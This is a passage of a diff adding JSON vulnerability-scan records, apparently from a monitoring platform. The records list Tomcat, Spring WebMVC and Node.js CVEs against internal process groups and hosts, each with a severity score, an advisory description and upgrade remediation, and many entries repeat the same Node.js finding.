+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-2085",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2025-53506"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.107, 10.1.43, 11.0.9 or higher.",
+      "vulnerability.title": "Allocation of Resources Without Limits or Throttling",
+      "vulnerability.type": "Allocation of Resources Without Limits or Throttling",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling via HTTP/2 multiplexing feature. an attacker can trigger resource exhaustion by creating excessive HTTP/2 streams within a single TCP connection.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.29",
+      "vulnerability.references.cwe": [
+        "CWE-770"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "13434076902554658846",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-2085",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2025-53506"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.107, 10.1.43, 11.0.9 or higher.",
+      "vulnerability.title": "Allocation of Resources Without Limits or Throttling",
+      "vulnerability.type": "Allocation of Resources Without Limits or Throttling",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling via HTTP/2 multiplexing feature. an attacker can trigger resource exhaustion by creating excessive HTTP/2 streams within a single TCP connection.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-770"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "13481824898786932151",
+      "affected_entity.id": "PROCESS_GROUP-07B10C4B318157AB",
+      "vulnerability.display_id": "S-1409",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2024-34750"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.90, 10.1.25, 11.0.0-M21 or higher.",
+      "vulnerability.title": "Insufficient Session Expiration",
+      "vulnerability.type": "Insufficient Session Expiration",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Insufficient Session Expiration due to an infinite timeout being assigned to an open connection improperly, in `http2/Stream.java`. An attacker can force this situation by sending an HTTP/2 stream with excessive headers, causing an out-of-memory error or exhausting `maxConnections`.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-26A8F982838B2846",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.29",
+      "vulnerability.references.cwe": [
+        "CWE-613"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-3F7B9BDCAA7FB667"
+    },
+    {
+      "vulnerability.id": "13481824898786932151",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-1409",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2024-34750"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.90, 10.1.25, 11.0.0-M21 or higher.",
+      "vulnerability.title": "Insufficient Session Expiration",
+      "vulnerability.type": "Insufficient Session Expiration",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Insufficient Session Expiration due to an infinite timeout being assigned to an open connection improperly, in `http2/Stream.java`. An attacker can force this situation by sending an HTTP/2 stream with excessive headers, causing an out-of-memory error or exhausting `maxConnections`.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-613"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14349962933157764239",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-1838",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.7,
+      "vulnerability.cvss.base_score": 9.2,
+      "vulnerability.references.cve": [
+        "CVE-2024-50379"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.apache.tomcat.embed:tomcat-embed-core` to version 9.0.98, 10.1.34, 11.0.2 or higher.",
+      "vulnerability.title": "Time-of-check Time-of-use (TOCTOU) Race Condition",
+      "vulnerability.type": "Time-of-check Time-of-use (TOCTOU) Race Condition",
+      "vulnerability.description": "[org.apache.tomcat.embed:tomcat-embed-core](https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core) is a Core Tomcat implementation.\n\nAffected versions of this package are vulnerable to Time-of-check Time-of-use (TOCTOU) Race Condition. On case insensitive file systems, when the default servlet is write-enabled, an attacker can upload a malicious file containing executable code and bypass case sensitivity checks, causing it to be treated as a JSP and executed.\r\n\r\nThis vector has been observed when the application is under load and read and upload operations are performed on the same file simultaneously.\r\n\r\n**Note:**\r\n\r\nThe default `readonly` initialization parameter value of `true` is not vulnerable.\r\n\r\nThis is related to [CVE-2024-56337](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHETOMCAT-8547998) where additional configurations are defined to fully mitigate this issue as upgrading to the fixed version doesn't fully mitigate this vulnerability;\r\n\r\nIn addition to upgrading to the fixed version, users are advised to apply the following mitigations, depending on which version of Java they are using with Tomcat :\r\n\r\n1) running on Java 8 or Java 11: the system property `sun.io.useCanonCaches` must be explicitly set to false (it defaults\r\nto true)\r\n\r\n2) running on Java 17: the system property `sun.io.useCanonCaches`, if set, must be set to false (it defaults to false)\r\n\r\n3) running on Java 21 onwards: no further configuration is required (the system property and the problematic cache have been removed)",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.apache.tomcat.embed:tomcat-embed-core:9.0.64",
+      "vulnerability.references.cwe": [
+        "CWE-367"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.7,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14399793962725499925",
+      "affected_entity.id": "PROCESS_GROUP-D0BD2796D4234A0D",
+      "vulnerability.display_id": "S-1689",
+      "vulnerability.stack": "CODE_LIBRARY",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.1,
+      "vulnerability.cvss.base_score": 8.7,
+      "vulnerability.references.cve": [
+        "CVE-2024-38819"
+      ],
+      "vulnerability.remediation.description": "Upgrade `org.springframework:spring-webmvc` to version 6.1.14 or higher.",
+      "vulnerability.title": "Path Traversal",
+      "vulnerability.type": "Relative Path Traversal",
+      "vulnerability.description": "[org.springframework:spring-webmvc](https://mvnrepository.com/artifact/org.springframework/spring-webmvc) is a package that provides Model-View-Controller (MVC) architecture and ready components that can be used to develop flexible and loosely coupled web applications.\n\nAffected versions of this package are vulnerable to Path Traversal through the functional web frameworks `WebMvc.fn` or `WebFlux.fn`. An attacker can craft malicious HTTP requests and obtain any file on the file system that is also accessible.\r\n\r\n**Note:**\r\nThis is similar to [CVE-2024-38816](https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORK-7945490), but with different input.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-06482451E7E75E3A",
+      "affected_entity.vulnerable_component.name": "org.springframework:spring-webmvc:5.3.21",
+      "vulnerability.references.cwe": [
+        "CWE-23"
+      ],
+      "vulnerability.parent.davis_assessment.score": 7.1,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-16C1BC2B82E7B29B",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-E198ABCC1B2E376C",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-A9197D4D850CFDB0",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-408204AC24A891F7",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-E4561BB525218EEB",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-A0D14C85AEE468AC",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-ED45332136B22668",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-E40E068DCBD63372",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-C5DC6850840BB918",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-8C2188489BE97EB8",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-7705246EEC28C0E3",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-1385D62E5A081B61",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-54567CEDED2347AB",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-04CABB0377608E72",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-283DEA70223CF60D",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-77892626993B47CB",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-D7937001F34F90DE"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-DE4E27515FEBBCCC",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
+      "dt.entity.host": "HOST-6A34B5BDF3D1048E"
+    },
+    {
+      "vulnerability.id": "14735552067185693763",
+      "affected_entity.id": "PROCESS_GROUP-013F9660C9646BBC",
+      "vulnerability.display_id": "S-585",
+      "vulnerability.stack": "SOFTWARE",
+      "vulnerability.davis_assessment.level": "HIGH",
+      "vulnerability.davis_assessment.score": 7.5,
+      "vulnerability.cvss.base_score": 7.5,
+      "vulnerability.references.cve": [
+        "CVE-2023-23919"
+      ],
+      "vulnerability.remediation.description": null,
+      "vulnerability.title": "CVE-2023-23919",
+      "vulnerability.type": "Not available",
+      "vulnerability.description": "A cryptographic vulnerability exists in Node.js <19.2.0, <18.14.1, <16.19.1, <14.21.3 that in some cases did does not clear the OpenSSL error stack after operations that may set it. This may lead to false positive errors during subsequent cryptographic operations that happen to be on the same thread. This in turn could be used to cause a denial of service.",
+      "affected_entity.affected_processes.ids": "PROCESS_GROUP_INSTANCE-3A321F0C9FEBC935",
+      "affected_entity.vulnerable_component.name": "Node.js 14.20.1 ",
+      "vulnerability.references.cwe": [],
+      "vulnerability.parent.davis_assessment.score": 7.5,
